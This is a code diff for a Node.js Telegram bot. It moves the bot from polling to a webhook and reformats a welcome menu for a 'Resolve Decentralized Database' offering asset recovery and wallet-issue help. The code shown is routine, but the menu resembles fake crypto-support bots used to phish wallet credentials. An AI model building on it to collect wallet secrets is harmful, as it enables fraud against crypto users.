@@ -5,32 +5,40 @@ const axios = require('axios');
 
 dotenv.config();
 const app = express();
+app.use(express.json()); // Needed for Telegram webhook updates
+
 const PORT = process.env.PORT || 8080;
-
-// Health check endpoint
-app.get('/health', (req, res) => {
-  res.status(200).send('Bot is running!');
-});
-
-app.listen(PORT, () => {
-  console.log(`Health check server running on port ${PORT}`);
-});
 
 // Environment Variables
 const token = process.env.BOT_TOKEN;
 const ownerId = process.env.OWNER_ID;
 const formUnstaticURL = process.env.FORM_UNSTATIC_URL;
+const appUrl = process.env.APP_URL; // Add this in Railway (https://your-app.up.railway.app)
 
-// Check if required environment variables exist
-if (!token || !ownerId || !formUnstaticURL) {
+if (!token || !ownerId || !formUnstaticURL || !appUrl) {
   console.error(
     'Missing required environment variables. Check your .env file.'
   );
   throw new Error('Missing required environment variables!');
 }
 
-const bot = new TelegramBot(token, { polling: true });
-console.log('Bot started successfully!');
+// Create bot WITHOUT polling
+const bot = new TelegramBot(token);
+
+// Set webhook
+bot.setWebHook(`${appUrl}/bot${token}`);
+console.log('Bot webhook set successfully!');
+
+// Webhook endpoint (Telegram will POST updates here)
+app.post(`/bot${token}`, (req, res) => {
+  bot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.status(200).send('Bot is running ✅');
+});
 
 // Store user states
 const chatStates = {};
@@ -102,18 +110,18 @@ bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   const message = `🌠 Welcome to the Resolve Decentralized Database
 
-  Here, you can address issues such as:
-  • Bot glitches
-  • Swap failures
-  • Configuration errors
-  • Asset recovery
-  • Validation problems
-  • High slippage
-  • Rugged token issues
-  • Failed transactions
-  • High gas fees
+Here, you can address issues such as:
+• Bot glitches
+• Swap failures
+• Configuration errors
+• Asset recovery
+• Validation problems
+• High slippage
+• Rugged token issues
+• Failed transactions
+• High gas fees
 
-  🚀 Please select an issue to continue.`;
+🚀 Please select an issue to continue.`;
 
   const options = {
     reply_markup: {
@@ -254,4 +262,9 @@ bot.on('callback_query', (query) => {
   }
 
   bot.answerCallbackQuery(query.id);
+});
+
+// Start server
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
 });
